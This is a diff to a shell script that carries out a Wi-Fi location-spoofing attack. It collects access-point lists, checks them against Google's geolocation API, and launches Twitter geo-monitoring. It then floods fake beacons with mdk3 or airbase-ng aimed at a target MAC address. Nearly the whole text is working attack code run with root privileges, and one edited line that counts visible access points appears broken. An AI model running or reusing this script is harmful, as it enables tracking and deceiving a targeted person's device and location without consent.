@@ -72,6 +72,7 @@ target_mac="$3";
 
 tmpfile=$(mktemp)
 tmpfile2=$(mktemp)
+tmpfile3=$(mktemp)
 
 # Proper exit on ^C
 trap "kill 0" EXIT
@@ -87,8 +88,15 @@ fi
 nb_aps=$(cat $tmpfile | wc -l)
 echo "Got $nb_aps APs"
 
-echo "Checking that obtained APs exist in Google's database"
-$torify ./filter_ap_list.sh $tmpfile
+if [ "$check_AP" -eq 1 ]
+then
+    echo "Checking that obtained APs exist in Google's database"
+    $torify ./filter_ap_list.sh $tmpfile > $tmpfile2
+    nb_aps_filtered=$(cat $tmpfile2 | wc -l)
+    echo "$nb_aps_filtered APs remaining"
+else
+    cp $tmpfile $tmpfile2
+fi
 
 echo "Getting a list of currently visible APs..."
 echo "We need to be root for this"
@@ -96,8 +104,8 @@ echo "We need to be root for this"
 sudo ifconfig "$interface" down \
   && sudo iwconfig "$interface" mode managed \
   && sudo ifconfig "$interface" up
-./get_current_ssid.pl $use_mdk3 "$interface" >> ${tmpfile}_filtre
-nb_visible_aps=$(echo $(cat ${tmpfile}_filtre | wc -l) "-$nb_aps" | bc)
+./get_current_ssid.pl $use_mdk3 "$interface" >> $tmpfile2
+nb_visible_aps=$(echo $(cat $tmpfile | wc -l) "-$nb_aps" | bc)
 echo "Got $nb_visible_aps new APs."
 if [ "$nb_visible_aps" -gt "$nb_aps" ]
 then
@@ -115,8 +123,8 @@ then
     exit;
 fi
 echo "Checking the precise location that we should get from Google API..."
-./convert_to_google_api.pl $use_mdk3 ${tmpfile}_filtre > $tmpfile2
-res=$(curl -d @$tmpfile2 -H "Content-Type: application/json" -i "https://www.googleapis.com/geolocation/v1/geolocate?key=$api_key" 2>/dev/null)
+./convert_to_google_api.pl $use_mdk3 $tmpfile2 > $tmpfile3
+res=$(curl -d @$tmpfile3 -H "Content-Type: application/json" -i "https://www.googleapis.com/geolocation/v1/geolocate?key=$api_key" 2>/dev/null)
 
 # echo -n "Now, open another terminal and launch: php filter-track-geo.php "
 echo -n "Launching Twitter monitoring "
@@ -129,8 +137,8 @@ php filter-track-geo.php $(echo $lat-$precision | bc) $(echo $long-$precision | 
 if [ "$use" == "mdk3" ]
 then
     echo -e "\nLaunching the attack with mdk3 and the list of APs."
-    sudo mdk3 "$interface" b -v $tmpfile -g -t >/dev/null
+    sudo mdk3 "$interface" b -v $tmpfile2 -g -t >/dev/null
 else
     echo -e "\nLaunching the attack with aircrack-ng and the list of APs."
-    sudo airbase-ng -m $tmpfile -p -X -d $target_mac wlan0
+    sudo airbase-ng -m $tmpfile2 -p -X -d $target_mac wlan0
 fi
